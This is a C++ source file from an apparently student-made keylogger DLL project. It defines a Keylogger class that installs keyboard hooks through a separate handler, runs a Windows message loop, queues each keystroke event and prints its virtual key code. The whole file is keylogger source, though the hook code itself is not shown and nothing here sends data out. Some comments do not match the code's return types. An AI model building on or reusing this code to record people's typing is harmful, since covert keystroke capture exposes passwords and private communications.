/**
* Project Keylogger
*/

#include "keylogger_dll/Keylogger.h"

/**
* Keylogger implementation
*/
Keylogger::Keylogger() : _eventManager(*(new EventManager(*this))), _hookHandler(*(new HookHandler(_eventManager))) {
	_running = false;
}

Keylogger::~Keylogger()
{
}


/**
* @return bool
*/
bool Keylogger::init() {
	_events.clear();
	_hookHandler.init();
	run();
	return true;
}

/**
* @return void
*/
bool Keylogger::run() {
	MSG msg;
	_running = true;
	while (GetMessage(&msg, NULL, 0, 0) && _running)
	{
	}
	return true;
}

/**
* @return bool
*/
bool Keylogger::stop() {
	_running = false;
	return false;
}

/**
* @return bool
*/
bool Keylogger::kill() {
	return false;
}

/**
* @param AEvent*
* @return bool
*/
bool Keylogger::pushToQueue(const AEvent* event) {
	int size = _events.size();
	_events.push_back(const_cast<AEvent*>(event));
	if (_events.size() == size)
	{
		return false;
	}
	std::cout << event->getVirtualKeyCode() << std::endl;
	//std::cout << "Event pushed : " << event-> << std::endl;
	return true;
}
